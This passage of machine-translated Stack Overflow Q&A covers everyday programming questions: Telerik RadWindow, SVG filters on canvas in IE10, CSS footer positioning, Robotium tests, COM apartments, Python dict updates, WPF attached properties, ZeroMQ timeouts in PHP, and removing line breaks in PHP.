<telerik:RadWindowManager ID="MasterRadWindowManager" runat="server" VisibleStatusbar="false"
        DestroyOnClose="false">

    </telerik:RadWindowManager> 
```

如何将 RadWindow 从 ContentPage (Default.aspx) 添加到 MasterPage 中的 RadWindowManager？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T16:18:16.287

RadWindow:

```
RadWindow radwindowNews = new RadWindow();
radwindowNews.ID = "RadWindow1";
radwindowNews.Width = 820;
radwindowNews.Height = 600;
radwindowNews.Modal = true;
radwindowNews.ReloadOnShow = true;
radwindowNews.AutoSize = false;
radwindowNews.ShowContentDuringLoad = false;
radwindowNews.Behaviors = WindowBehaviors.Close; 
```

Add the RadWindow:

```
RadWindowManager radManager =
    (RadWindowManager)this.Master.FindControl("MasterRadWindowManager");
radManager.Windows.Add(radwindowNews); 
```

# html - 将 SVG 过滤器应用于 HTML5 画布？

> ID：10757649
> 
> 赞同：3
> 
> 时间：2012-05-25T15:55:01.103
> 
> 标签：html, internet-explorer, canvas, svg, windows-runtime

**目标：**使用 html5 和 JavaScript 将 CSS 过滤器应用于视频。

**限制：**该解决方案*必须*与*Internet Explorer 10（适用于 Windows 8）*兼容。我真的在制作一个 Metro 应用程序。

**到目前为止：** 我有一个`<video>`我正在抽到一个`<canvas>`. 我以为我可以将 CSS 过滤器直接应用于此（例如`invert`或`brightness`），但事实证明这些过滤器与 IE10 不兼容。

**想法：**我希望有一种方法可以将 SVG 过滤器应用于画布。这可能吗？我是否需要将其复制`<canvas>`到`<image>`并对其应用过滤器？或者，是否应该有办法将画布包裹在`<foreignObject>`?

## 谢谢你的帮助！

这里有一些代码供有兴趣的人参考：

过滤器.svg：

```
<?xml version="1.0" standalone="no"?>
<svg width="1" height="1" version="1.1"
xmlns="http://www.w3.org/2000/svg"
xmlns:xlink="http://www.w3.org/1999/xlink">
  <defs>
    <filter id="blur">
      <feGaussianBlur in="SourceGraphic" stdDeviation="2 3" />
    </filter>
  </defs>
</svg> 
```

样式.css：

```
.a {
    filter: url(filter.svg#blur);
    -ms-transform: matrix(-1, 0, 0, 1, 0, 0);
} 
```

page.html：

```
<div class="itemtemplate" data-win-control="WinJS.Binding.Template">
            <canvas class="a" style="width: 180px;height:180px;margin-bottom: -5px;" data-win-bind="style.backgroundColor: bc; id: effectId" />
</div> 
```

**以下代码可以实现我的*目标*，尽管速度很慢。谢谢你，安东尼！**

```
<html>
<head>

</head>
<body>
<svg id="svgroot"  viewbox="0 0 800 800" width="800" height="800"  preserveAspectRatio="xMidYMin">
    <defs>
<filter id="myHueRotate">
<feColorMatrix type="hueRotate" values="270"/>
</filter>
</defs>
<image id="a" filter="url(#myHueRotate)"  x="0" y="0" width="300" height="300" />
<image id="b" filter="url(#myHueRotate)"  x="300" y="0" width="300" height="300" />
<image id="c" filter="url(#myHueRotate)"  x="0" y="300" width="300" height="300" />
<image id="d" filter="url(#myHueRotate)"  x="300" y="300" width="300" height="300" />
</svg>
<canvas id="canvas" height="300" width="300"></canvas>
<video id="vid" src="movie.m4v" height="300" width="300" style="display: none" autoplay/>

<script>
  var ctx = document.getElementById('canvas').getContext('2d');
  var img = new Image();
  img.src = 'img.jpg';
  img.onload = function(){
    //ctx.drawImage(img,0,0);
    //var canvasImage = canvas.toDataURL("image/png");
    //var svgImage = document.getElementById('a');
    //svgImage.setAttributeNS("http://www.w3.org/1999/xlink", "xlink:href", canvasImage);
    draw();
  }
img.load();

function draw(){
    var ctx = document.getElementById('canvas').getContext('2d');
    var vid = document.getElementById('vid')
    ctx.drawImage(vid,0,0,300,300);
    var canvasImage = canvas.toDataURL("image/png");
    document.getElementById('a').setAttributeNS("http://www.w3.org/1999/xlink", "xlink:href", canvasImage);
    document.getElementById('b').setAttributeNS("http://www.w3.org/1999/xlink", "xlink:href", canvasImage);
    document.getElementById('c').setAttributeNS("http://www.w3.org/1999/xlink", "xlink:href", canvasImage);
    document.getElementById('d').setAttributeNS("http://www.w3.org/1999/xlink", "xlink:href", canvasImage);
    setTimeout(draw,40);
}
</script>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-26T13:22:59.093

首先，要阅读的文章：

[转向基于标准的 web-graphics-in-ie10](http://blogs.msdn.com/b/ie/archive/2011/12/07/moving-to-standards-based-web-graphics-in-ie10.aspx)

请特别注意以下部分：

> 使用 SVG，而不是 VML

和

> 使用 CSS3，而不是 DX 过滤器

在第二部分，他们提到：

> DX 过滤器与 SVG 过滤器效果不同，尽管两者都使用 CSS 属性名称过滤器。

第二条：

[过滤器和转换简介](http://msdn.microsoft.com/en-us/library/ms533035%28v=vs.85%29.aspx)

他们给出了如何使用的具体示例`invert`，但是，假设它是IE 中*的*方式，我可以理解为什么它不容易找到，并且可能会或可能不会在您的情况下工作。但CSS将是：

```
#yourTargetElement {
     filter: DXImageTransform.Microsoft.BasicImage(invert=1);
} 
```

他们没有提到亮度，但确实提到了其他几个过滤器和过渡，第一篇文章确实提到了使用 SVG。更多详细信息（希望对您有所帮助）：

[IE10 中的 SVG 滤镜效果](http://blogs.msdn.com/b/ie/archive/2011/10/14/svg-filter-effects-in-ie10.aspx)

这看起来像关键的第 1 部分：

> 过滤器通过 filter 属性应用于 SVG 元素，形式为 filter="url(#filterId)"，或者可以作为 CSS 属性 filter:url(#filterId)

这是第 2 部分：

> 有 16 种不同的过滤器原语。

现在，我相信他们提到的 16 个是 SVG 的完整集，但了解 MS，它也可能意味着：

1.  这些是我们支持的 16 个，或者
2.  这些是我们发明的 16 个，以继续我们的主张，即使 IE 标准兼容和 SVG/MathML 友好，但使其比在任何其他浏览器中更难......因为我们可以。

或者，引用莉莉汤姆林的话：“我们不在乎，我们不必……我们是电话公司。”

但是，假设 MS 最终意识到他们需要赶上，进一步阅读 16 个原始过滤器，假设您只有嵌入的 SVG，过滤器在正确的位置 ( `defs`) 并通过 css 调用它们。这是他们的一个例子（我稍微修改和简化了）：

### 带嵌入式 SVG 的 HTML：

```
<div id="svg_wrapper">
<svg xmlns="http://www.w3.org/2000/svg" id="svgroot" viewBox="0 0 800 533" preserveAspectRatio="xMidYMin">
    <defs>
     <filter id="filtersPicture">
             <feComposite operator="arithmetic" k1="0" k2="1" k3="0" k4="0" 
               in="SourceGraphic" in2="SourceGraphic" result="inputTo_6">
             </feComposite>      
             <feColorMatrix type="saturate" id="filter_6" values="2" 
                            data-filterId="6">
             </feColorMatrix>
             </filter>
   </svg>
  </div> 
```

### CSS（他们使用 JS 使其动态化，所以要小心）：

```
<style type="text/css">
     #yourTargetElement{
             filter:url(#filtersPicture);
      }
 </style> 
```

我警告他们让它看起来多么“简单”的原因是因为他们正在通过 js 和交互式表单添加样式（也许你有同样的想法），但我认为这与在在 DOM 中之前的脚本，因为它找不到过滤器并引发错误。因此，请确保如果您想保持简单（非动态）并且事情仍然无法正常工作，请尝试将 filter/svg 放在样式之上（即使这会导致闪烁）。

# css - CSS圆角div，带有“绝对”的页脚放置位置

> ID：10757654
> 
> 赞同：0
> 
> 时间：2012-05-25T15:55:26.373
> 
> 标签：css, html, position, width, absolute

我正在尝试使用页眉和页脚创建圆角。我能够强制页眉位于顶部，但我不明白为什么我不能强制页脚位于底部。

事实上，位置是绝对的；底部：0；这样做，但我的页脚仅在文本的长度中。当我添加 width:100%; 时，页脚变得比 ???

在这里你可以看到我的代码：http: [//jsfiddle.net/fleduc/GN9q5/](http://jsfiddle.net/fleduc/GN9q5/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T16:07:47.797

你设置`left: 0`，`right: 0`而不是`width: 100%;`- 见测试[http://jsfiddle.net/thebabydino/GN9q5/3/](http://jsfiddle.net/thebabydino/GN9q5/3/)

您可能还想阅读此[http://www.456bereastreet.com/archive/201112/the_difference_between_widthauto_and_width100/](http://www.456bereastreet.com/archive/201112/the_difference_between_widthauto_and_width100/)

确实，您在这里有绝对定位，`width: auto`在这种情况下不会起作用，但您必须了解这`width: 100%`意味着*容器的宽度**没有**填充和边框*（除非您使用`box-sizing: border-box`）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T16:09:18.147

您已经指定了 div 的宽度，单位为 px，那么您可以指定页脚的宽度（单位为 px）吗？示例：http: [//jsfiddle.net/GN9q5/4/](http://jsfiddle.net/GN9q5/4/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-25T16:10:26.100

只需更改此 css 即可使用；-)

```
.rcs .ftr {                        
        margin:110px 0 0 0; 
        font-size:1.2em; 
        padding:5px 0px 5px 10px;        
        border-bottom-left-radius: 0.35em;
        border-bottom-right-radius: 0.35em;
        border-top:1px solid #AAAAAA;
    } 
```

见测试[http://jsfiddle.net/GN9q5/5/](http://jsfiddle.net/GN9q5/5/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-25T15:59:02.503

绝对定位的元素不再是布局的一部分。他们不知道父元素有多大，因此您必须将宽度设置为静态值。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-25T16:03:14.220

您必须设置`width`绝对值并计算填充。

举个例子：

```
If you have a width of 960px and a padding of "5px", your with must be 950px.

You SHOULD remove it for reason that I don't exactly know. 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-05-25T16:08:10.543

```
/*footer*/
.rcs .ftr {                        
    margin:0; 
    font-size:1.2em; 
    padding:5px 5px 5px 10px;
    position: absolute; 
    bottom: 0px;
    width: 385px;          
  border-bottom-left-radius: 0.35em;
  border-bottom-right-radius: 0.35em;
    border-top:1px solid #AAAAAA;
} 
```

您将容器宽度设置为 400 像素。左右填充 = 15px，所以减去它并将宽度设置为 385px。

更多信息：[绝对与相对位置宽度和高度](https://stackoverflow.com/questions/5323177/absolute-vs-relative-position-width-height)

此外，请确保关闭所有声明。

# android - Robotium 活动泄漏导致其他测试的错误活动

> ID：10757656
> 
> 赞同：1
> 
> 时间：2012-05-25T15:55:31.367
> 
> 标签：android, robotium, junit3

我的 Robotium 测试有一些问题。我有 3 个测试类，每个类都有大约 2 到 3 个方法。它们都在 Android 生命周期中测试不同的活动。我发现的问题是，当测试 A 按下 A 中的按钮时，会为测试通过然后完成的下一个活动调用意图。然后测试 B 尝试开始一项活动。然后我注意到来自测试 A 的 Activity 仍然存在。我尝试使用它来解决问题。这个想法是设备会等到活动空闲，然后我将结束任何不活动的活动。然后我会结束所有打开并离开的。

```
 getInstrumentation().waitForIdleSync();
 solo.finishInactiveActivities();
 solo.finishOpenedActivities(); 
```

我不确定这是否是 100% 解决此问题的最佳方法。我注意到它在 80% 的时间里都有效，但我仍然有一些泄漏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-04T16:05:39.947

我通过使用 solo.goBack(); 解决了这个问题；函数调用。这将杀死所有打开的活动，以便在您的测试期间没有活动泄漏。我还使用了上面放置的代码作为双重封面。在众多设备和场景上重复这些测试后，它似乎通过了。

# multithreading - 公寓是在服务器端还是在客户端在进程外环境中“生活”？

> ID：10757659
> 
> 赞同：1
> 
> 时间：2012-05-25T15:55:58.820
> 
> 标签：multithreading, winapi, com, atl, apartments

我很难理解外部进程环境中的 COM 公寓。

基本上我不明白为什么客户需要打电话`CoInitializeEx`在公寓中注册它自己的线程。我可以理解服务器线程使用的对象以及 STA 或 MTA 中的服务器线程。但我不明白为什么*客户*应该关心这个。

每个文件/指南都说客户必须打电话`CoInitializeEx`才能在公寓中注册。这是否意味着服务器会跟踪客户端的线程？或者公寓数据也分配在客户端进程上？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T19:17:51.690

驻留在进程外服务器中的 COM 对象实际上由两部分组成 - 服务器中的实现代码和由编译器和 COM 运行时创建的 RPC 代理/存根代码。调用远程 COM 对象转换为对本地代理对象的调用，然后使用一些 RPC 机制来编组调用并将调用作为消息传输到服务器进程。消息由服务器中的存根选取，然后调用真正的 COM 对象并将结果编组回代理，然后代理将其解组并将其返回给调用客户端代码。从客户端和 COM 对象的角度来看，所有调用都是本地调用，即使像 DCOM 一样通过网络发生。

现在客户端中的代理的行为就像一个普通的 COM 对象，它必须驻留在某种公寓中。服务器中的 COM 对象也位于它自己的单元中。COM 允许客户端和服务器具有不同的线程模型并处理适当的同步（当两个互操作的代码位于不同的进程中时，这很容易）。

我建议您阅读 MSDN 上 COM 指南中的[Process、Thread 和 Apartments](http://msdn.microsoft.com/en-us/library/windows/desktop/ms693344%28v=vs.85%29.aspx)部分，以更好地了解哪一个是什么以及它们是如何互连的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T18:28:01.920

跟踪线程不是服务器，它是 COM 将线程附加到某个单元。并且它是客户端拥有线程，因此创建STA或MTA是客户端的选择。

一旦客户端为线程选择了所需的单元模型，COM 将决定如何准确地满足某些调用。如果一个 COM 类注册为仅在 MTA 中运行，并且客户端的线程是 STA，那么 COM 负责在工作 MTA 线程上创建实际对象并将其接口编组到客户端的 STA 中。

客户端选择操作模式，COM 与服务器注册一起获取。

# python - 当更新依赖于值本身时，是否有一种 pythonic 方式来更新字典值？

> ID：10757660
> 
> 赞同：3
> 
> 时间：2012-05-25T15:56:00.480
> 
> 标签：python

我发现自己在很多情况下都有一个想要用新值更新的字典值，但前提是新值满足与当前值相关的某些标准（例如更大）。

目前我写的表达式类似于：

```
dictionary[key] = max(newvalue, dictionary[key]) 
```

效果很好，但我一直认为可能有一种更简洁的方法可以做到这一点，而无需重复自己。

感谢您的任何建议。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-25T15:59:10.927

您可以使用封装该逻辑的更新方法创建值对象。或子类化字典并修改`__setitem__`. 请记住，您这样做的任何事情都会使不熟悉您的代码的人不太清楚发生了什么。你现在做的事情是最明确和最清楚的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-25T16:03:58.217

只需为自己编写一个辅助函数：

```
def update(dictionary, key, newvalue, func=max):
    dictionary[key] = func(dictionary[key], newvalue) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-26T03:24:39.513

不确定它是否“更整洁”，但避免重复自己的一种方法是使用面向对象的方法并将内置类子类化`dict`以使某些东西能够做你想做的事情。这还有一个优点，即可以使用自定义类的实例代替`dict`实例，而无需更改其余代码。

```
class CmpValDict(dict):
    """ dict subclass that stores values associated with each key based
       on the return value of a function which allow the value passed to be
       first compared to any already there (if there is no pre-existing
       value, the second argument passed to the function will be None)
    """
    def __init__(self, cmp=None, *args, **kwargs):
        self.cmp = cmp if cmp else lambda nv,cv: nv  # default returns new value
        super(CmpValDict, self).__init__(*args, **kwargs)

    def __setitem__(self, key, value):
        super(CmpValDict, self).__setitem__(key, self.cmp(value, self.get(key)))

cvdict = CmpValDict(cmp=max)

cvdict['a'] = 43
cvdict['a'] = 17
print cvdict['a']  # 43

cvdict[43] = 'George Bush'
cvdict[43] = 'Al Gore'
print cvdict[43]  # George Bush 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-26T18:59:47.803

如何使用 Python 版本的三元运算符：

```
d[key]=newval if newval>d[key] else d[key] 
```

或单行，如果：

```
if newval>d[key]: d[key]=newval 
```

# c# - 依赖属性 - 无法从 XAML 设置值

> ID：10757666
> 
> 赞同：4
> 
> 时间：2012-05-25T15:56:12.847
> 
> 标签：c#, wpf, xaml, dependency-properties, masking

我有以下声明：

```
public static readonly DependencyProperty PassColorProperty = DependencyProperty.RegisterAttached("PassColor",
            typeof(string),
            typeof(ColorMasking),
            new PropertyMetadata("#FFCCFF"));

    public string PassColor
    {
        get { return (string)GetValue(PassColorProperty); }
        set { SetValue(PassColorProperty, value); }
    } 
```

目前这段代码无法编译，因为我没有在我的类中添加 : DependencyProperty。当我添加该代码时，它说字符串 PassColor 无效。

根本没有字符串，代码编译，我可以设置从该类中读取属性。我无法从我的 XAML 中设置它。它说该属性不存在。我的xml是：

```
<TextBox Grid.Column="1" Grid.Row="8" Margin="3" Width="Auto" Height="Auto" VerticalAlignment="Stretch" HorizontalAlignment="Stretch" 
                b:ColorMasking.Mask=" ... Long Regex Command ... "
                b:ColorMasking.PassColor="99FF99" /> 
```

设置掩码的代码完美运行。我想我也复制了所有需要的东西。为什么我不能添加另一个属性令人困惑。

如果重要的话，这是我编写的这段代码的变体：[如何定义文本框输入限制？](https://stackoverflow.com/questions/1103765/how-to-define-textbox-input-restrictions)

编辑：

```
public class ColorMasking : DependencyObject
{
    private static readonly DependencyPropertyKey _maskExpressionPropertyKey = DependencyProperty.RegisterAttachedReadOnly("MaskExpression",
            typeof(Regex),
            typeof(ColorMasking),
            new FrameworkPropertyMetadata());

    /// <summary>
    /// Identifies the <see cref="Mask"/> dependency property.
    /// </summary>
    /// 
    public static readonly DependencyProperty PassColorProperty = DependencyProperty.Register("PassColor",
            typeof(string),
            typeof(ColorMasking),
            new PropertyMetadata("#99FF99"));

    public static readonly DependencyProperty FailColorProperty = DependencyProperty.Register("FailColor",
            typeof(string),
            typeof(ColorMasking),
            new PropertyMetadata("#FFCCFF"));

    public static readonly DependencyProperty MaskProperty = DependencyProperty.RegisterAttached("Mask",
            typeof(string),
            typeof(ColorMasking),
            new FrameworkPropertyMetadata(OnMaskChanged)); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-25T17:09:12.270

您发布的代码显示您正在注册[AttachedProperty](http://msdn.microsoft.com/en-us/library/ms749011)，因此 PassColorProperty 不是 ColorMasking 类的 DependencyPropery。它必须通过一个设置了附加属性的对象来访问。附加属性将允许您在其他对象上设置该属性，而不仅仅是

```
 public static void SetPassColor(DependencyObject obj, string passColor)
    {
        obj.SetValue(PassColorProperty, passColor);
    }

    public static string GetPassColor(DependencyObject obj)
    {
        return (string)obj.GetValue(PassColorProperty);
    } 
```

除了[MSDN](http://msdn.microsoft.com/en-us/library/ms749011)之外，这解释了附加属性的访问器：

> 获取访问器
> 
> GetPropertyName 访问器的签名必须是：
> 
> 公共静态对象获取PropertyName（对象目标）
> 
> - 可以在您的实现中将目标对象指定为更具体的类型。例如，DockPanel.GetDock 方法将参数类型为 UIElement，因为附加的属性只打算在 UIElement 实例上设置。
> 
> - 可以在您的实现中将返回值指定为更具体的类型。例如，GetDock 方法将其键入为 Dock，因为该值只能设置为该枚举。
> 
> 设置访问器
> 
> SetPropertyName 访问器的签名必须是：
> 
> public static void Set PropertyName（对象目标，对象值）
> 
> - 可以在您的实现中将目标对象指定为更具体的类型。例如，SetDock 方法将其键入为 UIElement，因为附加的属性只打算在 UIElement 实例上设置。
> 
> - 值对象可以在您的实现中指定为更具体的类型。例如，SetDock 方法将其键入为 Dock，因为该值只能设置为该枚举。请记住，此方法的值是来自 XAML 加载器的输入，当它在标记中的附加属性用法中遇到您的附加属性时。该输入是在标记中指定为 XAML 属性值的值。因此，您使用的类型必须有类型转换、值序列化器或标记扩展支持，以便可以从属性值（最终只是一个字符串）创建适当的类型。

# php - ZeroMQ PHP 超时

> ID：10757667
> 
> 赞同：1
> 
> 时间：2012-05-25T15:56:13.083
> 
> 标签：php, timeout, request, zeromq

我的 PHP 脚本通过 ZeroMQ 与在后端运行并等待消息的 PHP 守护程序进行通信时遇到问题。如果守护进程关闭，则请求的 php 会等待无休止的时间。如果我重新加载页面 firefox 以无限循环结束，我必须重新启动 apache2 以终止正在运行的请求。尤其是在daemon没有完成的开发中，真的很烦人。有人知道我如何设置超时，或者只是说，当守护程序无法访问时跳过发送请求（然后向管理员发送消息，服务器已关闭并返回错误）？

我试过这样的事情：

```
$context = new ZMQContext(1);
$req = new ZMQSocket($context, ZMQ::SOCKET_REQ);

$req->connect("tcp://localhost:5557");

$read = $write = array();

// Poll socket for a reply, with timeout
$poll = new ZMQPoll();
$poll->add($req, ZMQ::POLL_OUT);
$events = $poll->poll($read, $write, 3000);
       $errors = $poll->getLastErrors();

if($errors)   
  echo "No connection";
else 
  echo "connection";

... $data = ....
$req->send(json_encode($data)); 
```

第二个问题，我使用 shaneharter 的 PHP-Daemon，有时当守护程序由于错误而无法正确启动或者我用 CRTL+C zeromq 关闭它时，仍然保留地址，当我重新启动守护程序时它会抛出异常，这个地址是已在使用中。我可以轻松销毁所有 ZeroMQ 连接吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-09T01:24:11.317

您无需投票即可发送简单的消息。我认为`PUSH`套接字会更好地为您服务。设置一个合理的延迟值，这将尝试向`PULL`套接字对应方发送消息，无论它是否正在侦听。

```
$context = new ZMQContext();
$socket = new ZMQSocket($context, ZMQ::SOCKET_PUSH);
$socket->setSockOpt(ZMQ::SOCKOPT_LINGER, 2000);
$socket->connect("tcp://localhost:5557");
$socket->send($data); 
```

# c# - 从此 C# 程序中删除元素

> ID：10757669
> 
> 赞同：0
> 
> 时间：2012-05-25T15:56:16.360
> 
> 标签：c#, .net

> **可能重复：**
> [有机会使用 Linq (C#) 获得唯一记录吗？](https://stackoverflow.com/questions/724479/any-chance-to-get-unique-records-using-linq-c)

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace WaysOf100
{
class WaysOf100Test
{
    static void Main(string[] args)
    {
        WaysOf100 test= new WaysOf100();
        test.Go();
        test.EliminateDuplicates();
    }
}

class WaysOf100
{        
    List<string> results = new List<string>();             

    public void Go()
    {
        int num = 5, temp=0;//to store the intermediate difference
        for (int i = 1; i <num; i++)
        {
            temp = num - i;
            for (int j = 1; j <= temp; j++)
            {
                if (temp % j == 0)
                {   
                    //Console.Write(i + " ");
                    string text = "";                        
                    text = i.ToString();                        
                    for (int k = 1; k <= (temp / j); k++)
                    {
                        //Console.Write(j + " ");  
                        text += j.ToString();
                    }
                    char[] rev = text.ToCharArray();
                    Array.Reverse(rev);                       
                    if(!(results.Contains(rev.ToString())))
                        results.Add(text);                        

                }
            }                
        }
    }

    public void EliminateDuplicates()
    {            
        //To eliminate the duplicates   

        /*for (int i = 0; i < results.Count; i++)
        {

            for (int j = 0; j < results.Count; j++)
            {

                if (!(results[i].Equals(results[j])))
                {
                    char [] rev = results[j].ToCharArray();
                    Array.Reverse(rev);                        
                    if (results[i]==rev.ToString())
                        results.Remove(rev.ToString());
                }                                       
            }
        }*/

        foreach (var result in results)
        {
           Console.WriteLine(result);
        }
        Console.WriteLine("Total number of elements is :{0}",results.Count);
    }
} 
```

}

到目前为止的结果是 11111 122 14 2111 23 311 32 41

简而言之，这就是我想要的：41 的倒数是 14，而 14 已经存在于列表中，所以我不想添加 41。同样，32 的倒数是 23，它也存在，因此不应添加 32。但是我为实现该功能而编写的这个可能并没有给出预期的结果

```
if(!(results.Contains(rev.ToString())))
      results.Add(text); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T16:54:42.257

您遇到的问题是`rev.ToString()'`返回`"System.Char[]"`而不是您想要/预期的字符串值。对于您的逻辑，请尝试以下操作：

```
 public void EliminateDuplicates()
    {
        //Eliminate the duplicates    

        for (int i = 0; i < results.Count; i++)
        {
            for (int j = 0; j < results.Count; j++)
            {
                if (!(results[i].Equals(results[j])))
                {
                    char[] rev = results[j].ToCharArray();
                    char[] forward = results[i].ToCharArray();
                    Array.Reverse(rev);
                    bool bEqual = true;
                    for( int n = 0 ; n < results[j].Length && true == bEqual ; n++ )
                    {
                        if( rev[n] != forward[n] )
                        {
                            bEqual = false;
                        }
                    }
                    if( true == bEqual)
                        results.Remove(results[j] );
                }
            }
        }

        foreach (var result in results)
        {
            Console.WriteLine(result);
        }
        Console.WriteLine("Total number of elements is : {0} ", results.Count);
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T17:08:58.230

终于自己解决了。。

```
if (!(results.Contains(new string(rev))))
    results.Add(text); 
```

更改了`rev.ToString()`as`new string(rev)`并且现在可以正常工作。我想要的已经实现了。非常感谢各位的帮助

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-25T16:41:15.617

reverse 是您要检查的唯一情况吗？一种方法是在比较之前将您的结果规范化为例如排序顺序。因此，在比较之前将 132 和 213 都转换为 123。

# php - 如何从字符串中删除换行符（无字符！）？

> ID：10757671
> 
> 赞同：180
> 
> 时间：2012-05-25T15:56:47.577
> 
> 标签：php, html, replace, line-breaks, nl2br

这似乎是一个骗局，但请放心，它不是——我已经搜索了 SO 以及网络的其他部分来寻找我的问题的答案，并最终一遍又一遍地找到同样不充分的“解决方案”。无论如何，这里是：

我正在将用户输入从 textarea 保存到 MySQL 数据库（在 WordPress 环境中，但我相信这与这个问题无关）。它稍后会从数据库中检索，以显示给站点后端的管理员。当用户提交带有换行符的文本时（即按 Enter 键），就会出现问题。

示例字符串可能如下所示：

```
Dear friends, I just wanted so Hello. How are you guys? I'm fine, thanks!

Greetings,
Bill 
```

字符串中没有行尾字符（“\n”、“\r”等）。

我正在使用`nl2br()`它来生成 HTML 输出，但这还不够。结果是：

```
Dear friends, I just wanted so Hello. How are you guys? I'm fine, thanks!<br />
<br />
Greetings,<br />
Bill 
```

据我了解，这是预期的`nl2br()`结果，因为它插入了标签并且不应该首先替换换行符？

但是我需要的格式是这样的：

```
Dear friends, I just wanted so Hello. How are you guys? I'm fine, thanks!<br /><br />Greetings,<br />Bill 
```

如果字符串中包含 EOL 字符，例如“\n”，我会使用其中一个`str_replace()`或`preg_replace()`完成它，但是如果那里没有字符，我不知道用什么针来喂这些函数中的任何一个首先。

我可以手动访问数据库中的相关字段，为每个换行符点击 Backspace 以及我稍后想要对字符串执行的操作。所以我知道我需要上述格式。

* * *

## 回答 #1

> 赞同：524
> 
> 时间：2013-12-21T09:59:37.877

[Ben 的解决方案](https://stackoverflow.com/a/10757755/662581)是可以接受的，但[str_replace()](http://www.php.net/manual/en/function.str-replace.php)比[preg_replace()快得多](http://www.php.net/preg_replace)

```
$buffer = str_replace(array("\r", "\n"), '', $buffer); 
```

使用更少的 CPU 功率，减少世界二氧化碳排放量。

* * *

## 回答 #2

> 赞同：421
> 
> 时间：2012-05-25T16:02:05.873

您应该能够用删除所有换行符和回车符的 preg 替换它。代码是：

```
preg_replace( "/\r|\n/", "", $yourString ); 
```

即使`\n`字符没有出现，如果你得到回车，那里会有一个不可见的字符。preg 替换应该抓住并修复这些。

* * *

## 回答 #3

> 赞同：18
> 
> 时间：2012-05-25T16:03:13.393

```
$str = "
Dear friends, I just wanted so Hello. How are you guys? I'm fine, thanks!<br />
<br />
Greetings,<br />
Bill";

echo str_replace(array("\n", "\r"), '', $str);  // echo $str in a single line 
```

* * *

## 回答 #4

> 赞同：12
> 
> 时间：2015-03-03T00:26:51.500

这是因为[`nl2br()`](http://php.net/nl2br)根本不删除新行。

> 返回在所有换行符（、和）之前插入`<br />`或`<br>` **插入**的字符串。`\r\n``\n\r``\n``\r`

改用`str_replace`：

```
$string = str_replace(["\r\n", "\r", "\n"], "<br />", $string); 
```

* * *

## 回答 #5

> 赞同：10
> 
> 时间：2015-07-06T13:50:57.853

str_replace(PHP_EOL, null, $str);

* * *

## 回答 #6

> 赞同：8
> 
> 时间：2016-04-18T14:49:53.510

您还可以使用[PHP 修剪](http://php.net/manual/en/function.trim.php "修剪")

> 此函数返回一个字符串，其中从 str 的开头和结尾去除了空格。如果没有第二个参数， trim() 将删除这些字符：
> 
> *   " " (ASCII 32 (0x20))，一个普通的空格。
> *   "\t" (ASCII 9 (0x09))，一个制表符。
> *   "\n" (ASCII 10 (0x0A))，换行（换行）。
> *   "\r" (ASCII 13 (0x0D))，回车。
> *   “\0”（ASCII 0 (0x00)），NUL 字节。
> *   "\x0B" (ASCII 11 (0x0B))，一个垂直制表符。

* * *

## 回答 #7

> 赞同：7
> 
> 时间：2014-09-11T05:43:55.557

为了在 Windows 上也能正常工作，我建议使用

```
$buffer = str_replace(["\r\n", "\r", "\n"], "", $buffer); 
```

`"\r\n"`- 适用于 Windows，`"\r"`- 适用于 Mac 和`"\n"`- 适用于 Linux

* * *

## 回答 #8

> 赞同：7
> 
> 时间：2015-08-11T12:31:21.813

功能更强大的东西（易于在任何地方使用）：

```
function strip_carriage_returns($string)
{
    return str_replace(["\n\r", "\n", "\r"], '', $string);
} 
```

使用*PHP_EOL*作为搜索替换参数也是一个好主意！荣誉。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2021-07-14T11:11:58.980

我认为我的回答为时已晚，但是在 JS 脚本中使用它时遇到了同样的额外行问题，但它的工作原理是这样的

这将`<br />`在字符串中添加和换行符。

```
$text = nl2br($text); 
```

此行将删除多余的行。

```
$text = preg_replace("/\r|\n/", "", $text); 
```

在插入数据库时`<br />`​​用任何不需要的常用符号（如星号）替换：`**`

```
$text = str_replace("<br />","**",$text ); 
```

当我想在程序中使用它时，我用它来替换`**`.

```
$text = str_replace("**","\\n",$text ); 
```

然后`$text`在程序中使用

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2019-10-07T13:27:30.947

我使用 3 行来完成这项工作，所以将**$s**视为您的“东西”......

```
$s=str_replace(chr(10),'',$s);
$s=str_replace(chr(13),'',$s);
$s=str_replace("\r\n"),'',$s); 
```

*   传奇：

**chr(10)** ___换行

**chr(13)** ___回归

**\r\n** ______换行

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2019-10-27T07:22:25.127

替代内置：[trim()](https://www.php.net/manual/en/function.trim.php)

```
trim — Strip whitespace (or other characters) from the beginning and end of a string
Description ¶
trim ( string $str [, string $character_mask = " \t\n\r\0\x0B" ] ) : string

This function returns a string with whitespace stripped from the beginning and end of str.
Without the second parameter, trim() will strip these characters:

    " " (ASCII 32 (0x20)), an ordinary space.
    "\t" (ASCII 9 (0x09)), a tab.
    "\n" (ASCII 10 (0x0A)), a new line (line feed).
    "\r" (ASCII 13 (0x0D)), a carriage return.
    "\0" (ASCII 0 (0x00)), the NUL-byte.
    "\x0B" (ASCII 11 (0x0B)), a vertical tab. 
```

